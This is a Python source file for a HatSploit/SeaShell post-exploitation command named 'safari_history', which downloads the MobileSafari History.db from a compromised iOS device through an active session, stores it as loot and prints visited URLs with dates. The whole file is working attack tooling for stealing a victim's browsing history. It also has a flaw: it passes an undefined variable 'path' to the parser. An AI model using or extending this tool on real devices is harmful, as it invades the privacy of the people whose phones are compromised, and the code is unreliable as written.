"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.lib.loot import Loot

from pex.db import DB

from hatsploit.lib.command import Command


class HatSploitCommand(Command):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "gather",
            'Name': "safari_history",
            'Authors': [
                'Ivan Nikolsky (enty8080) - command developer'
            ],
            'Description': "View MobileSafari.app history.",
            'Usage': "safari_history",
            'MinArgs': 0
        }

        self.db = DB()

    def run(self, argc, argv):
        if self.session.download('/private/var/mobile/Library/Safari/History.db',
                                 Loot().specific_loot('History.db')):
            self.print_process("Parsing history database...")

            try:
                history = self.db.parse_safari_history(path)
            except Exception:
                self.print_error("Failed to parse history database!")
                return

            history_data = []
            for item in history:
                history_data.append((item['date'], item['details']['url']))

            if history_data:
                self.print_table("History", ('Date', 'URL'), *history_data)
            else:
                self.print_warning("No history available on device.")
